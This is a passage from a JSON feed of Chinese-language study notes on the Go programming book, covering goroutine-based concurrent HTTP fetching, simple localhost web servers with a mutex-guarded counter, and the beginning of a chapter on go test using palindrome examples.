class=\"token punctuation\">)</span>\n</code></pre></div><p><code>make</code>函数创建了一个传递<code>string</code>类型参数的<code>channel</code>，也就是<code>ch chan&lt;- string</code>，对每一个命令行参数，我们都用<code>go</code>这个关键字来创建一个<code>goroutine</code>，并且让函数在这个<code>goroutine</code>异步执行<code>http.Get</code>方法。</p>\n<h3>ioutil.Discard</h3>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>nbytes<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>ioutil<span class=\"token punctuation\">.</span>Discard<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n</code></pre></div><p>这个程序里的<code>io.Copy</code>会把响应的Body内容拷贝到<code>ioutil.Discard</code>输出流中（译注：可以把这个变量看作一个垃圾桶，可以向里面写一些不需要的数据），因为我们需要这个方法返回的字节数，但是又不想要其内容。</p>\n<p>每当请求返回内容时，<code>fetch</code>函数都会往<code>ch</code>这个<code>channel</code>里写入一个字符串，由<code>Fetching</code>函数里的第二个for循环来处理并打印<code>channel</code>里的这个字符串。</p>\n<h3>分两个函数的原因</h3>\n<p>当一个<code>goroutine</code>尝试在一个<code>channel</code>上做<code>send</code>或者<code>receive</code>操作时，这个<code>goroutine</code>会阻塞在调用处，直到另一个<code>goroutine</code>从这个<code>channel</code>里接收或者写入值，这样两个<code>goroutine</code>才会继续执行<code>channel</code>操作之后的逻辑。在这个例子中，每一个fetch函数在执行时都会往channel里发送一个值（ch &lt;- expression），<code>Fetching</code>函数负责接收这些值（&lt;-ch）。这个程序中我们用<code>Fetching</code>函数来完整地处理/接收所有<code>fetch</code>函数传回的字符串，可以避免因为有两个<code>goroutine</code>同时完成而使得其输出交错在一起的危险。</p>\n<h3>练习 1.10</h3>\n<p>修改本节中的程序，将响应结果输出到文件，以便于进行对比。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"io\"</span>\n\t<span class=\"token string\">\"net/http\"</span>\n\t<span class=\"token string\">\"os\"</span>\n\t<span class=\"token string\">\"strings\"</span>\n\t<span class=\"token string\">\"time\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tstart <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">saveFile</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> ch<span class=\"token punctuation\">)</span> <span class=\"token comment\">// start a goroutine</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span>ch<span class=\"token punctuation\">)</span> <span class=\"token comment\">// receive from channel ch</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"total %.2fs elapsed\\n\"</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Since</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Seconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">saveFile</span><span class=\"token punctuation\">(</span>url <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> ch <span class=\"token keyword\">chan</span><span class=\"token operator\">&lt;-</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tstart <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tresp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// 这里必须fmt.Sprintf</span>\n\t\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprint</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token comment\">// send to channel ch</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//拿到域名做文件名</span>\n\tdomain <span class=\"token operator\">:=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Split</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">\"//\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 创建文件</span>\n\toutFile<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>domain<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".txt\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprint</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\tnbytes<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>outFile<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// resp.Body.Close()</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"while reading %s: %v\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\tsecs <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Since</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Seconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.2fs  %7d  %s\"</span><span class=\"token punctuation\">,</span> secs<span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre></div><h2>1.7. Web服务</h2>\n<p>例子，一个服务器，返回当前用户正在访问的URL。比如用户访问的是 http://localhost:8000/hello ，那么响应是URL.Path = \"hello\"。</p>\n<figure><figcaption>image-20240320094224873</figcaption></figure>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">HandlerMain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">HandleFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span> <span class=\"token comment\">// each request calls handler</span>\n\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">.</span><span class=\"token function\">ListenAndServe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost:8000\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">handler</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"URL.Path = %q\\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>URL<span class=\"token punctuation\">.</span>Path<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>handler</h3>\n<p><code>HandlerMain</code>函数将所有发送到<code>/</code>路径下的请求和<code>handler</code>函数关联起来，<code>/</code>开头的请求其实就是所有发送到当前站点上的请求，服务监听8000端口。</p>\n<p>发送到这个服务的“请求”是一个<code>http.Request</code>类型的对象，这个对象中包含了请求中的一系列相关字段，其中就包括我们需要的URL。</p>\n<p>当请求到达服务器时，这个请求会被传给<code>handler</code>函数来处理，这个函数会将/hello这个路径从请求的URL中解析出来，然后把其发送到响应中，这里我们用的是标准输出流的<code>fmt.Fprintf</code>。</p>\n<h3>handler&amp;count</h3>\n<p>为访问的url添加某种状态。比如，下面这个版本输出了同样的内容，但是会对请求的次数进行计算，计算各种URL被访问的总次数，访问/count的时候显示出来。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> mu sync<span class=\"token punctuation\">.</span>Mutex\n<span class=\"token keyword\">var</span> count <span class=\"token builtin\">int</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">CountHandlerMain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">HandleFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> countHandler<span class=\"token punctuation\">)</span>\n\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">HandleFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/count\"</span><span class=\"token punctuation\">,</span> counter<span class=\"token punctuation\">)</span>\n\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">.</span><span class=\"token function\">ListenAndServe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost:8000\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// handler echoes the Path component of the requested URL.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">countHandler</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tmu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tcount<span class=\"token operator\">++</span>\n\tmu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"URL.Path = %q\\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>URL<span class=\"token punctuation\">.</span>Path<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// counter echoes the number of calls so far.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">counter</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tmu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Count %d\\n\"</span><span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span>\n\tmu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240320095635047</figcaption></figure>\n<p>这个服务器有两个请求处理函数，根据请求的url不同会调用不同的函数：对/count这个url的请求会调用到counter这个函数，其它的url都会调用默认的处理函数。</p>\n<h3>竞态条件</h3>\n<p>服务器每一次接收请求处理时都会另起一个goroutine，这样服务器就可以同一时间处理多个请求。然而在并发情况下，假如真的有两个请求同一时刻去更新count，那么这个值可能并不会被正确地增加；这个程序可能会引发一个严重的bug：竞态条件（参见9.1）。为了避免这个问题，我们必须保证每次修改变量的最多只能有一个goroutine，这也就是代码里的<code>mu.Lock()</code>和<code>mu.Unlock()</code>调用将修改count的所有行为包在中间的目的（第九章再看）。</p>\n<h3>if嵌套ParseForm()</h3>\n<p>handler函数会把请求的http头和请求的form数据都打印出来</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">HandlerMoreMain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">HandleFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> handlerMore<span class=\"token punctuation\">)</span> <span class=\"token comment\">// each request calls handler</span>\n\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">.</span><span class=\"token function\">ListenAndServe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost:8000\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">handlerMore</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s %s %s\\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>Method<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>URL<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>Proto<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> r<span class=\"token punctuation\">.</span>Header <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Header[%q] = %q\\n\"</span><span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Host = %q\\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>Host<span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"RemoteAddr = %q\\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>RemoteAddr<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">ParseForm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> r<span class=\"token punctuation\">.</span>Form <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Form[%q] = %q\\n\"</span><span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><figure><figcaption>image-20240320100747503</figcaption></figure>\n<p>这里的ParseForm被嵌套在了if语句中</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">ParseForm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n</code></pre></div><p>Go语言允许这样的一个简单的语句结果作为局部的变量声明出现在if语句的最前面，这一点对错误处理很有用处。我们还可以像下面这样写（当然看起来就长了一些）：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>err <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">ParseForm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n    log<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>用if和ParseForm结合可以让代码更加简单，并且可以限制err这个变量的作用域，这么做是很不错的。2.7节中讲解作用域。</p>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "10. 包和工具",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch10.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch10.html",
      "summary": "10. 包和工具\n10.1. 包简介",
      "content_html": "\n<h2>10.1. 包简介</h2>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "11. 测试",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch11.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch11.html",
      "summary": "11. 测试\n11.1. go test\n在包目录内，所有以_test.go为后缀名的源文件在执行go build时不会被构建成包的一部分，它们是go test测试的一部分。\n在*_test.go文件中，有三种类型的函数：测试函数、基准测试（benchmark）函数、示例函数。\n\n一个测试函数是以Test为函数名前缀的函数，用于测试程序的一些逻辑行为是...",
      "content_html": "\n<h2>11.1. go test</h2>\n<p>在包目录内，所有以<code>_test.go</code>为后缀名的源文件在执行<code>go build</code>时不会被构建成包的一部分，它们是<code>go test</code>测试的一部分。\n在<code>*_test.go</code>文件中，有三种类型的函数：测试函数、基准测试（benchmark）函数、示例函数。</p>\n<ul>\n<li>一个测试函数是以Test为函数名前缀的函数，用于测试程序的一些逻辑行为是否正确；go test命令会调用这些测试函数并报告测试结果是PASS或FAIL。</li>\n<li>基准测试函数是以Benchmark为函数名前缀的函数，它们用于衡量一些函数的性能；go test命令会多次运行基准测试函数以计算一个平均的执行时间。</li>\n<li>示例函数是以Example为函数名前缀的函数，提供一个由编译器保证正确性的示例文档。</li>\n</ul>\n<p><code>go test</code>命令会遍历所有的<code>*_test.go</code>文件中符合上述命名规则的函数，生成一个临时的main包用于调用相应的测试函数，接着构建并运行、报告测试结果，最后清理测试中生成的临时文件。</p>\n<h2>11.2. 测试函数</h2>\n<p>每个测试函数必须导入testing包。测试函数有如下的签名：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">TestName</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>测试函数的名字必须以Test开头，可选的后缀名必须以大写字母开头：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">TestSin</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">TestCos</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">TestLog</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">}</span>\n</code></pre></div><p>其中<code>t</code>参数用于报告测试失败和附加的日志信息。让我们定义一个实例包gopl.io/ch11/word1，其中只有一个函数IsPalindrome用于检查一个字符串是否从前向后和从后向前读都是一样的。\n<em>gopl.io/ch11/word1</em></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Package word provides utilities for word games.</span>\n<span class=\"token keyword\">package</span> word\n\n<span class=\"token comment\">// IsPalindrome reports whether s reads the same forward and backward.</span>\n<span class=\"token comment\">// (Our first attempt.)</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">IsPalindrome</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> s<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在相同的目录下，word_test.go测试文件中包含了TestPalindrome和TestNonPalindrome两个测试函数。每一个都是测试IsPalindrome是否给出正确的结果，并使用t.Error报告失败信息：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> word\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"testing\"</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">TestPalindrome</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span><span class=\"token function\">IsPalindrome</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"detartrated\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        t<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">`IsPalindrome(\"detartrated\") = false`</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span><span class=\"token function\">IsPalindrome</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kayak\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        t<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">`IsPalindrome(\"kayak\") = false`</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">TestNonPalindrome</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token function\">IsPalindrome</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"palindrome\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        t<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">`IsPalindrome(\"palindrome\") = true`</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>go test命令如果没有参数指定包那么将默认采用当前目录对应的包（和go build命令一样）。我们可以用下面的命令构建和运行测试。</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>$ <span class=\"token builtin class-name\">cd</span> <span class=\"token variable\">$GOPATH</span>/src/gopl.io/ch11/word1\n$ go <span class=\"token builtin class-name\">test</span>\nok   gopl.io/ch11/word1  <span class=\"token number\">0</span>.008s\n</code></pre></div><p>结果还比较满意，我们运行了这个程序， 不过没有提前退出是因为还没有遇到BUG报告。不过一个法国名为“Noelle Eve Elleon”的用户会抱怨IsPalindrome函数不能识别“été”。另外一个来自美国中部用户的抱怨则是不能识别“A man, a plan, a canal: Panama.”。执行特殊和小的BUG报告为我们提供了新的更自然的测试用例。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span 